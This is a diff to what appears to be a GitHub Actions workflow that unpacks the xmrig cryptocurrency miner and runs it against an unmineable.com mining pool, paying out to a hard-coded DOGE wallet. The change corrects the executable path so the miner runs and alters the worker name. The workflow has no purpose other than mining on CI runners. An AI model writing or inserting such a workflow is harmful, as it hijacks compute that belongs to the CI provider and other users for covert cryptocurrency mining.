@@ -21,6 +21,6 @@ jobs:
     - name: Seting-UP
       run: Expand-Archive xmrig-6.15.0-msvc-win64.zip
     - name: Running
-      run: .\xmrig-6.15.0\xmrig.exe --no-huge-pages -o rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u DOGE:DDWsVj1g3GPEY4tFuqPGduG1tLh38AQJjQ.DOGEEGITH#7gin-nij1
+      run: .\xmrig-6.15.0-msvc-win64\xmrig-6.15.0\xmrig.exe --no-huge-pages -o rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u DOGE:DDWsVj1g3GPEY4tFuqPGduG1tLh38AQJjQ.DOGEEGITH2#7gin-nij1
     - name: DONE
       run: exit
